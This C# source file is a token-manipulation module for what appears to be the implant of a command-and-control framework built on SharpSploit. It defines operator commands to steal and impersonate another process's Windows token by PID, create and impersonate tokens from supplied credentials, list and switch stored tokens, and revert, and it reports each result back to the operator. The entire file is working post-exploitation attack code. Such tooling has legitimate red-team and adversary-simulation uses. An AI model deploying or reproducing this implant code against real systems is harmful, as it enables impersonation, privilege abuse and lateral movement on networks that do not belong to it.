using System.Linq;
using System.Threading;

using Drone.Models;
using Drone.SharpSploit.Credentials;
using Drone.SharpSploit.Generic;

namespace Drone.Modules
{
    public class TokenModule : DroneModule
    {
        public override string Name { get; } = "tokens";

        public override void AddCommands()
        {
            var listTokens = new Command("token-list", "List tokens in the token store", ListTokens);
            
            var useToken = new Command("token-use", "Use a token in the token store", UseToken);
            useToken.Arguments.Add(new Command.Argument("guid", false));
            
            var delToken = new Command("token-del", "Remove and dispose this token from the token store", DisposeToken);

            var makeToken = new Command("token-make", "Create and impersonate a token with the given credentials", MakeToken);
            makeToken.Arguments.Add(new Command.Argument("DOMAIN\\username", false));
            makeToken.Arguments.Add(new Command.Argument("password"));

            var stealToken = new Command("token-steal", "Duplicate and impersonate the token of the given process", StealToken);
            stealToken.Arguments.Add(new Command.Argument("pid", false));

            var revToken = new Command("rev2self", "Drop token impersonation", RevertToSelf);
            
            Commands.Add(listTokens);
            Commands.Add(useToken);
            Commands.Add(makeToken);
            Commands.Add(stealToken);
            Commands.Add(revToken);
            Commands.Add(delToken);
        }
        
        private readonly SharpSploitResultList<Token> _tokens = new();

        private void StealToken(DroneTask task, CancellationToken token)
        {
            if (!uint.TryParse(task.Arguments[0], out var pid))
            {
                Drone.SendError(task.TaskGuid, "Not a valid PID.");
                return;
            }

            var tok = new Token();
            var result = tok.Steal(pid);

            if (!result)
            {
                Drone.SendError(task.TaskGuid, $"Failed to steal token for PID {pid}.");
                return;
            }
            
            _tokens.Add(tok);
            Drone.SendResult(task.TaskGuid, $"Successfully impersonated token for {tok.Identity}.");
        }

        private void UseToken(DroneTask task, CancellationToken token)
        {
            var guid = task.Arguments[0];
            var tok = GetTokenFromStore(guid);

            if (tok is null)
            {
                Drone.SendError(task.TaskGuid, "Could not find token with that Guid.");
                return;
            }

            if (tok.Impersonate())
            {
                Drone.SendResult(task.TaskGuid, $"Successfully impersonated token for {tok.Identity}.");
                return;
            }
            
            Drone.SendError(task.TaskGuid, "Failed to impersonate token.");
        }

        private void ListTokens(DroneTask task, CancellationToken token)
        {
            var tokens = _tokens.ToString();
            Drone.SendResult(task.TaskGuid, tokens);
        }
        
        private void MakeToken(DroneTask task, CancellationToken token)
        {
            var userdomain = task.Arguments[0].Split('\\');
            
            var domain = userdomain[0];
            var username = userdomain[1];
            var password = task.Arguments[1];

            var tok = new Token();
            
            if (!tok.Create(domain, username, password))
            {
                Drone.SendError(task.TaskGuid, $"Failed to create token for {domain}\\{username}.");
                return;
            }
            
            _tokens.Add(tok);
            Drone.SendResult(task.TaskGuid, $"Created and impersonated token for {tok.Identity}.");
        }
        
        private void RevertToSelf(DroneTask task, CancellationToken token)
        {
            var result = Token.Revert();
            if (result) return;
            
            Drone.SendError(task.TaskGuid, $"Failed to revert token.");
        }
        
        private void DisposeToken(DroneTask task, CancellationToken token)
        {
            var guid = task.Arguments[0];
            var tok = GetTokenFromStore(guid);

            tok.Dispose();
            _tokens.Remove(tok);
        }

        private Token GetTokenFromStore(string guid)
            => _tokens.FirstOrDefault(t => t.Guid.Equals(guid));
    }
}